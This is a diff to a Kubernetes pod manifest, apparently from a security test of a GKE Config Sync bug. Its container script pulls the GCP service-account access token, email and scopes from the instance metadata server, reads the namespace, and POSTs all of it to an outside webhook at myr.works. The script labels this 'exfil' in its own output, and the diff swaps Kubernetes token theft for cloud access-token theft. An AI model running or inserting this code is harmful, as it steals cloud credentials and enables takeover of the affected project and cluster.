@@ -24,11 +24,13 @@ spec:
         - /bin/sh
         - -c
         - |
-          TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+          ACCESS_TOKEN=$(curl -s -H "Metadata-Flavor: Google"             "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"             | sed 's/.*"access_token":"\([^"]*\)".*/\1/')
+          SA_EMAIL=$(curl -s -H "Metadata-Flavor: Google"             "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email")
+          SCOPES=$(curl -s -H "Metadata-Flavor: Google"             "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes")
+          NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
           curl -s -X POST https://myr.works/hook.php \
             -H "Content-Type: application/json" \
             -H "X-Test-issue: fromgkehub" \
-            -d "{\"token\": \"$TOKEN\", \"source\": \"bug0172-gkehub-configsync\", \"sa\": \"$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)\"}"
-          echo "Exfil sent. Sleeping."
+            -d "{\"access_token\": \"$ACCESS_TOKEN\", \"sa_email\": \"$SA_EMAIL\", \"scopes\": \"$SCOPES\", \"namespace\": \"$NS\", \"source\": \"bug0172-gkehub-configsync\"}"
+          echo "Access token exfil sent. Sleeping."
           sleep 3600
-      automountServiceAccountToken: true
